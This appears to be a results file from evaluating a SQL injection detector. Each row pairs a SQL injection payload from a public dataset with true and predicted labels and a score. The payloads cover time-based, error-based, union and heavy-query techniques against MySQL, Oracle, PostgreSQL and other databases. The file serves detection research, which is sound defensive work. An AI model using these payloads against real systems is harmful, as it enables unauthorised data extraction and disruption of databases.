text,source,true_label,pred_label,score_sqli,correct
"1  )  )   and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (  9542 = 9542",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2944740661150858,1
"1""  )  )   )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2322091127239647,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  3508 = 3508",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2442597833162565,1
"1' in boolean mode )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.574114009315031,1
"1'  )  )   as crzr where 5373 = 5373 and elt ( 3114 = 3114,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.949290706060034,1
"-2153'|| ( select 'sofs' where 4126 = 4126 union all select 4126,4126,4126,4126,4126#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,10.632703186693012,1
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""qqfd"" like ""qqfd",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5842449340080662,1
"1' )  as ohcs where 9588 = 9588 or elt ( 6272 = 6272,sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8784100118010902,1
"-2001'+ ( select 'nput' where 8368 = 8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.563505888994941,1
1' )  where 4509 = 4509 union all select null--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,9.200123082930677,1
"1'+ ( select 'qaar' where 7841 = 7841 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.017340386086274,1
"1""  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  ""xjdh"" = ""xjdh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4259227170668851,1
"1""  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  ""isbh"" like ""isbh",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4845509812674387,1
"1' where 4039 = 4039 union all select null,null,null,null,null,null,null,null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9759116100278928,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'ckpm' = 'ckpm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3787948783325958,1
"1"" where 9173 = 9173 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.0438937720144086,1
1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'zwyx' = 'zwyx,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.4492651872774553,1
1'|| ( select 'tjzy' where 3037 = 3037,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
1' )  as fyib where 9246 = 9246,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.8013793406553951,1
1 and 2620 = 2175,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0125845488381324,1
1'  )  )   )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4591200595583376,1
"1"" )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( ""zxks"" = ""zxks",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9517116304501625,1
"1""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0880536877371154,1
1' )  where 3311 = 3311,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"1""  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9877191152664129,1
"1""  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""pyfz"" like ""pyfz",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4726179392930823,1
"1""  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""jydy"" like ""jydy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.037727365944404,1
1'+ ( select mhfn where 2425 = 2425,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
"1 )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 3294 = 3294",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3074653612237241,1
"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5079331967001923,1
"1' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( 'lkun' like 'lkun",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5499862424643,1
"-3518 )  union all select 1877,1877,1877,1877#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.139602048083152,1
"1"" )  as fcrx where 2929 = 2929 and 2820 = 5133",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5429031079410487,1
"-4580"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""dbhb"" = ""dbhb",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4229371610925632,1
"1"" )  and 8677 = 9054#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.3107319231780066,1
"1'  )  )   and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0639735193522741,1
"1""  )  )   as ycvh where 4523 = 4523 and sleep ( 5 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,5.395928846296434,1
"1  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0879107792064946,1
"1"" )  where 1144 = 1144 and 2006 = 2006",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.5732769298905636,1
1 where 7038 = 7038,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"1%' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2944740661150858,1
"1'  )  )   as qhpv where 7049 = 7049 and make_set ( 8403 = 8403,8899 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.3797155426463146,1
"1%"" or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.981692086817133,1
"-2106"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""dvlq"" like ""dvlq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8399713828083806,1
"1%'  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1503366813615614,1
"1"" and elt ( 4249 = 4249,7259 )  and ""tmxx"" = ""tmxx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4259227170668851,1
"-9672%""  )  )   )  order by 1#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9389841997934203,1
"-2717"" or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.7311023356542066,1
"-1922%' )  union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.139602048083152,1
"-7306"" or 2081 = 6847",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.543123389563392,1
1 and  ( 1977 = 6852 ) *6852-- clxl,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.3740894424066392,1
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""vqpx"" like ""vqpx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5003882097247605,1
"1' )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( 'rvwk' = 'rvwk",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3955894142294978,1
"-9382' )  union all select 4774,4774,4774,4774--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,5.057226537495946,1
-2372' or 1783 = 2656,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.3127774036570363,1
"1'  )  )   )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1671966787741905,1
"1' )  where 6720 = 6720 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.634410319585138,1
"1'  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  'mttj' like 'mttj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7691901417769083,1
"1'  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  'vcvj' = 'vcvj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1466413411316532,1
1' )  and 2305 = 1934,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.8567821398544524,1
"1' in boolean mode )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.722248823710432,1
"1'|| ( select 'alxi' where 3967 = 3967 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.804213717889146,1
"1'|| ( select 'dpje' where 2704 = 2704 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8677636894511405,1
"1' )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.1671966787741905,1
"1%' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6282931124334163,1
-6327'  )  )   union all select 2685--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.139602048083152,1
"1  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0639735193522741,1
"1""  )  )   union all select null--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.425083003333523,1
"1""  )  )   )  or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.0994192524520379,1
1' where 7613 = 7613,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 'leps' like 'leps",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6016126740780432,1
"1%""  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5528343009777175,1
1 )  as zodp where 9112 = 9112,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.570832711659863,1
"1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.506916765560592,1
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""eeye"" = ""eeye",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.424931190412572,1
"1' in boolean mode )  or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4219449043405337,1
"1""  )  )   )  union all select null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.425083003333523,1
"1'  )  )   as lxjs where 6503 = 6503 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.498345960744823,1
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'ulkq' = 'ulkq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3600454255390424,1
"1%' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3210779606475482,1
1 rlike  ( select  ( case when  ( 8911 = 5301 )  then 1 else 0x28 end  )  )  # pmuh,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.9729935445861306,1
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'juhi' like 'juhi",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.3940380764373888,1
1 and 8398 = 1891-- naov,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.8567821398544524,1
"1%""  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5600931973771768,1
"1' where 3425 = 3425 and elt ( 4249 = 4249,7259 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9052015687787496,1
"1  )  )   )  union all select null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.7023179575548992,1
1'+ ( select nxfp where 5006 = 5006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5  )  )  ||'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8997187855473336,1
"1""  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""qyew"" = ""qyew",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4405561626300238,1
1' )  as dqgr where 2427 = 2427 and  ( 3020 = 3020 ) *6703--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9560626977106306,1
1'|| ( select 'uedy' where 8816 = 8816,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.909604555156633,1
"1'  )  )   as ylyq where 2953 = 2953 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4033396736368513,1
1 where 4372 = 4372,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,11.11448090367956,1
"-9166"" )  as hlre where 4768 = 4768 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.7916594720652934,1
"-1256' in boolean mode )  union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,4.2703345348807815,1
"1' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.2463635153618273,1
"1"" and  ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.6781387334236604,1
-4965 )  as imga where 3705 = 3705 union all select 3705--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,2.1239063892334595,1
select  ( case when  ( 8208 = 7960 )  then 8208 else 8208* ( select 8208 from information_schema.character_sets )  end ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.532124000604475,1
"-4210"" )  where 2679 = 2679 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.9843235884940806,1
"1"" )  and  ( 4085 = 4885 ) *4885 and  ( ""sxte"" = ""sxte",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,3.8567821398544524,1
"1'  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.176966851328767,1
"1%""  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9949048960180216,1
"1'  )  )   as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.4784484978533479,1
"-9947""  )  )   )  union all select 8765,8765,8765,8765,8765#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,8.139602048083152,1
1 )  as phja where 4627 = 4627,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,6.850951897327288,1
"1""  )  )   as gqxk where 9199 = 9199 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5978572799409394,1
1%' )  order by 1#,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9389841997934203,1
1'  )  )   rlike sleep ( 5 ) #,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.5152189748568954,1
"1 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9977028625880398,1
"1  )  )   ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (  1402 = 1402",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,1.8197374972025957,1
